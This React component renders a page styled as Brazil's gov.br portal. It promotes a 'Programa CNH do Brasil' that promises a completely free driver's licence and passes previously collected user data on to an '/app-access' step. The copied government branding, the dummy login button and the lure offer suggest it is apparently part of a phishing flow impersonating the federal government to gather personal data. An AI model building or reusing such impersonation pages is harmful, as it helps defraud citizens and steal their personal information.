import React from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { User } from 'lucide-react';

const EligibilityHeader: React.FC = () => (
    <header className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4">
            <div className="py-3 flex items-center justify-between">
                <div className="flex items-center gap-4">
                    <img 
                        src="/Gov.br_logo.svg.png" 
                        alt="gov.br" 
                        className="h-8 md:h-10"
                    />
                </div>
                <div className="flex items-center gap-2">
                    <button className="flex items-center gap-2 bg-[#004381] text-white px-4 py-1.5 rounded-full text-sm font-medium hover:bg-blue-900 transition-colors">
                        <User size={18} />
                        <span>Entrar</span>
                    </button>
                </div>
            </div>
        </div>
    </header>
);

const EligibilityPage: React.FC = () => {
    const navigate = useNavigate();
    const location = useLocation();

    const handleNext = () => {
        navigate('/app-access', { state: { userData: location.state?.userData } });
    };

    return (
        <div className="bg-gray-50 min-h-screen">
            <EligibilityHeader />
            <main className="max-w-xl mx-auto px-4 py-12">
                <div className="bg-white p-8 rounded-lg shadow-md border border-gray-200">
                    <div className="flex items-start gap-4 mb-6">
                        <div className="flex-shrink-0 w-8 h-8 bg-[#0d6efd] text-white rounded-full flex items-center justify-center font-bold text-lg">
                            1
                        </div>
                        <h1 className="text-2xl font-bold text-gray-800 pt-0.5">
                            Programa CNH do Brasil
                        </h1>
                    </div>

                    <img 
                        src="/cnh-no-celular.png" 
                        alt="Pessoa segurando celular com a CNH Digital" 
                        className="w-full rounded-lg mb-6"
                    />

                    <p className="text-gray-700 leading-relaxed mb-8">
                        O Programa CNH do Brasil é uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de Habilitação 100% GRATUITA! Se você for aprovado nos critérios do programa, não pagará nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.
                    </p>

                    <button 
                        onClick={handleNext}
                        className="w-full bg-[#0d6efd] text-white py-3 rounded-lg font-bold text-lg hover:bg-blue-700 transition-colors"
                    >
                        Avançar
                    </button>
                </div>
            </main>
        </div>
    );
};

export default EligibilityPage;